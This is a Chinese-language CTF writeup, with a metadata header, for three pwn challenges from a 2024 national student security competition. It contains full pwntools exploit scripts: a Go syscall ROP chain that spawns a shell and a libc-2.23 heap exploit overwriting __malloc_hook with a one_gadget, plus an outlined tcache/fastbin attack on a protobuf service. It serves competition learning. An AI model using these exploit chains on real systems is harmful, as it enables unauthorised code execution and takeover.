---
title: 第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup
contest: 国赛信安
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [Golang-pwn, Go-binary, syscall-ROP, libc-2.23, top-chunk-shrink, tcache-UAF, __malloc_hook, one_gadget, protobuf, ezybuf, struct-serialization]
attack_chain:
  - PWN gostack (一血): Go 二进制 + 0x208 长度判断 + 填 0x00 绕过字符串检查
  - 利用: pop_rdi=0x4a18a5 + pop_rsi=0x42138a + pop_rdx=0x4944ec + pop_rax=0x40f984 + syscall=0x4616c9
  - read(0, 0x05978D8, 0x30) → /bin/sh → execve("/bin/sh", 0, 0)
  - PWN orange_cat_diary (二血): libc-2.23 + 堆溢出 8 字节 + 改 top chunk size=0xfc1
  - 申请 0xff0 让 top 进 unsorted bin + 申请 0x68 触发残留 bk 泄 libc
  - show 泄 libc, UAF 改 __malloc_hook = one_gadget 0xf03a4
  - PWN ezbuf: protobuf 协议 (whatcon/whatidx/whatsize/whatsthis/uint32 whatsthis)
  - 函数 0 解析 / 1 add 0x30 / 3 show / 2 UAF
  - 10 次释放限制 + tcache 填充 + fastbin double free + _IO_2_1_stdout 泄 stack
key_payload: 'Go syscall ROP + libc-2.23 top chunk shrink 0xfc1 + UAF __malloc_hook one_gadget + protobuf whatcon/size'
one_liner: 国赛信安 3 题 PWN：Go gostack syscall ROP 一血 + orange_cat_diary top chunk 缩 + __malloc_hook one_gadget + ezbuf protobuf 协议。
lesson: Go 二进制 syscall ROP 是大题常见套路；top chunk shrink 触发 unsorted bin 是堆风水经典。
quality: high
---

# 第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup

**来源**: ctfiot.com ID 182350

## PWN

### 1. gostack（一血）

#### 漏洞
- 栈溢出（题目暗示）
- 测试 `"A"*0x218` 填充没反应（长度判断）
- 用 `\x00` 测试成功（避免字符串处理）

#### 利用
```python
from pwn import *
context(arch='amd64', os='linux', log_level="debug")
p = remote("8.147.132.163", 14137)
elf = ELF("./gostack")

pop_rsi = 0x42138a
pop_rdx = 0x4944ec
pop_rax = 0x40f984
pop_rdi = 0x4a18a5
syscall = 0x4616c9

payload  = b"\x00" * (0x208 - 0x8 * 7)
payload += p64(pop_rdi) + p64(0) + p64(0)*5
payload += p64(pop_rsi) + p64(0x05978D8)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(pop_rax) + p64(0x0) + p64(syscall)   # read(0, 0x05978D8, 0x30)
payload += p64(pop_rdi) + p64(0x005978D8) + p64(0)*5
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b) + p64(syscall)  # execve("/bin/sh", 0, 0)

p.sendlineafter("Input your magic message :", payload)
sleep(0.2)
p.send(b"/bin/sh\x00")
p.interactive()
```

### 2. orange_cat_diary（二血）

#### 漏洞
- UAF
- 堆溢出 8 字节

#### 利用
```python
from pwn import *
context(arch='i386', os='linux', log_level="debug")
libc = ELF("./libc-2.23.so")
p = remote("8.147.133.63", 16173)
elf = ELF("./orange_cat_diary")

def add(size, content):
    p.sendlineafter("Please input your choice:", "1")
    p.sendlineafter("Please input the length of the diary content:", str(size))
    p.sendafter("Please enter the diary content:", content)

def show():
    p.sendlineafter("Please input your choice:", "2")

def edit(size, content):
    p.sendlineafter("Please input your choice:", "4")
    p.sendlineafter("Please input the length of the diary content:", str(size))
    p.sendafter("Please enter the diary content:", content)

def dele():
    p.sendlineafter("Please input your choice:", "3")

# 1. 初始化 + 堆溢出 8 字节
p.sendafter("Hello, I'm delighted to meet you. Please tell me your name.", "AAA")
add(0x38, "AAAA")
edit(0x40, b"\x00" * 0x38 + p64(0xfc1))  # 改 top chunk size=0xfc1

# 2. 触发 top chunk 进 unsorted bin
add(0xff0, "AAA")
add(0x68, b"A" * 8)  # 触发残留 bk 泄 libc

# 3. show 泄 libc
show()
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(0x8, b"\x00")) - 1640 - 0x10 - libc.sym['__malloc_hook']
print(hex(libc.address))

# 4. UAF 改 __malloc_hook
one_gadget = 0xf03a4 + libc.address
dele()
edit(0x10, p64(libc.sym['__malloc_hook'] - 0x23))
add(0x68, b"A" * 8)
add(0x68, b"\x00" * 0x13 + p64(one_gadget))

# 5. 触发 malloc
p.sendlineafter("Please input your choice:", "1")
p.sendlineafter("Please input the length of the diary content:", str(0x20))
p.interactive()
```

### 3. ezbuf

#### 数据结构（protobuf）
```protobuf
syntax = "proto3";
message devicemsg {
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
```

#### 函数
- 函数 0: 解析发包数据
- 函数 1: 申请 0x30 chunk + copy 数据
- 函数 2: 漏洞所在（UAF，但只有 10 次释放机会）
- 函数 3: 打印 chunk 数据（最好用 2 次，否则会关掉标准输出）

#### 思路
- 释放第一个 0x40 chunk → 打印 → 泄 heap
- 通过遗留 unsorted bin 的 bk 泄 libc
- 填满 tcache → 触发 fastbin double free
- _IO_2_1_stdout 泄 stack
- 任意地址写（控制 tcache bin 管理 chunk）

## 评价
国赛信安初赛 3 题 PWN：
- Go 二进制 gostack 一血（syscall ROP）
- orange_cat_diary 二血（top chunk 缩 + UAF __malloc_hook）
- ezbuf（protobuf 协议 + tcache/fastbin 攻击）

覆盖 Go PWN + 经典堆利用 + 协议逆向。
